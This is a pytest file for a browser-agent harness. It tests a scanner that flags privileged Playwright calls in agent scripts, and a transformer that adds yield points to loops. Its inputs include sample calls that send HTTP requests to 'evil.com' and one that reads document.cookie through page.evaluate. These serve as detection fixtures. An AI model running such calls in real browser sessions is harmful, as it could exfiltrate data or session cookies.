"""Tests _PrivilegedAPIScanner and _AsyncYieldInjector in execute_script."""

from __future__ import annotations

import ast
import textwrap

import pytest

from myrm_agent_harness.toolkits.browser.tools.execute_script import (
    _AsyncYieldInjector,
    _PrivilegedAPIScanner,
)


def _scan(code: str) -> list[str]:
    tree = ast.parse(textwrap.dedent(code))
    scanner = _PrivilegedAPIScanner()
    scanner.visit(tree)
    return scanner.violations


class TestPageRequestDetection:
    def test_page_request_get(self) -> None:
        violations = _scan("resp = await page.request.get('http://evil.com')")
        assert any(".request.get()" in v for v in violations)

    def test_page_request_post(self) -> None:
        violations = _scan("resp = await page.request.post('http://evil.com', data={})")
        assert any(".request.post()" in v for v in violations)

    def test_page_request_put(self) -> None:
        violations = _scan("resp = await page.request.put('http://evil.com')")
        assert any(".request.put()" in v for v in violations)

    def test_page_request_delete(self) -> None:
        violations = _scan("resp = await page.request.delete('http://evil.com')")
        assert any(".request.delete()" in v for v in violations)

    def test_page_request_fetch(self) -> None:
        violations = _scan("resp = await page.request.fetch('http://evil.com')")
        assert any(".request.fetch()" in v for v in violations)


class TestPrivilegedAttrDetection:
    def test_page_evaluate(self) -> None:
        violations = _scan("result = await page.evaluate('() => document.cookie')")
        assert any(".evaluate" in v for v in violations)

    def test_page_evaluate_handle(self) -> None:
        violations = _scan("handle = await page.evaluate_handle('() => window')")
        assert any(".evaluate_handle" in v for v in violations)

    def test_page_context_access(self) -> None:
        violations = _scan("ctx = page.context")
        assert any(".context" in v for v in violations)

    def test_page_request_attr(self) -> None:
        violations = _scan("req_api = page.request")
        assert any(".request" in v for v in violations)


class TestSafeUsageNoFalsePositives:
    def test_session_interact_safe(self) -> None:
        violations = _scan("await session.interact('click', 'e1')")
        assert violations == []

    def test_refs_access_safe(self) -> None:
        violations = _scan("info = refs['e1']")
        assert violations == []

    def test_session_attribute_safe(self) -> None:
        violations = _scan("page = session._tab_controller.get_active_page()")
        assert violations == []

    def test_print_safe(self) -> None:
        violations = _scan("print('hello world')")
        assert violations == []

    def test_asyncio_sleep_safe(self) -> None:
        violations = _scan("await asyncio.sleep(1)")
        assert violations == []


class TestNestedAccess:
    def test_chained_request_get(self) -> None:
        violations = _scan("r = await session._tab_controller.get_active_page().request.get('http://x.com')")
        assert any(".request.get()" in v for v in violations)

    def test_variable_alias_request(self) -> None:
        code = """\
page = session._tab_controller.get_active_page()
resp = await page.request.post('http://evil.com')
"""
        violations = _scan(code)
        assert any(".request.post()" in v for v in violations)


@pytest.mark.parametrize("method", ["get", "post", "put", "delete", "patch", "fetch", "head"])
def test_all_http_methods_detected(method: str) -> None:
    violations = _scan(f"await page.request.{method}('http://evil.com')")
    assert any(f".request.{method}()" in v for v in violations)


class TestAsyncYieldInjector:
    def test_for_loop_gets_sleep_injected(self) -> None:
        code = "async def f():\n    for i in range(10):\n        pass\n"
        tree = ast.parse(code)
        tree = _AsyncYieldInjector().visit(tree)
        ast.fix_missing_locations(tree)
        result = ast.unparse(tree)
        assert "asyncio.sleep(0)" in result

    def test_while_loop_gets_sleep_injected(self) -> None:
        code = "async def f():\n    while True:\n        break\n"
        tree = ast.parse(code)
        tree = _AsyncYieldInjector().visit(tree)
        ast.fix_missing_locations(tree)
        result = ast.unparse(tree)
        assert "asyncio.sleep(0)" in result

    def test_nested_loops_both_injected(self) -> None:
        code = "async def f():\n    for i in range(5):\n        while True:\n            break\n"
        tree = ast.parse(code)
        tree = _AsyncYieldInjector().visit(tree)
        ast.fix_missing_locations(tree)
        result = ast.unparse(tree)
        assert result.count("asyncio.sleep(0)") == 2

    def test_no_loop_no_injection(self) -> None:
        code = "async def f():\n    x = 1\n"
        tree = ast.parse(code)
        original = ast.unparse(tree)
        tree = _AsyncYieldInjector().visit(tree)
        ast.fix_missing_locations(tree)
        result = ast.unparse(tree)
        assert result == original
